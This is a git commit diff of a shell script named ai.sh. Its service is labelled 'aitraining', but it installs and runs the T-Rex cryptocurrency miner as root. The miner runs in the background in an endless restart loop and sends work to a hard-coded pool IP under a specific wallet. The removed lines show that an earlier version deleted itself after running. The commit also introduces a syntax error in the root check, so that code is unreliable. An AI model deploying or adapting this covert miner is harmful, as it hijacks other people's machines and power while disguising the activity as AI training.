e74f6234e7b93d2b5d3e7d5c455ac2a06ca80a3b
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-29 06:01:59 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -5,23 +5,23 @@ SERVICE_NAME="aitraining"
 SCRIPT_PATH="/root/${SERVICE_NAME}_script.sh"
 
 # Check for root privileges
-if [ "$(id -u)" -ne 0 ]; then
+if [ "$(id -u)" -ne 0; then
   exit 1
 fi
 
-# Create the miner script
+# Create the miner script with a loop
 cat <<'EOF' > "$SCRIPT_PATH"
 #!/bin/bash
-wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
-tar xvzf t-rex-0.26.8-linux.tar.gz
-./t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch
+while true; do
+  wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+  tar xvzf t-rex-0.26.8-linux.tar.gz
+  ./t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch
+  sleep 10 # Add a delay before restarting in case of failure
+done
 EOF
 
 # Set permissions for the script
 chmod 700 "$SCRIPT_PATH"
 
-# Run the script in the background using nohup
+# Run the looping script in the background using nohup
 nohup "$SCRIPT_PATH" > /root/aitraining.log 2>&1 &
-
-# Delete this setup script
-rm -- "$0"
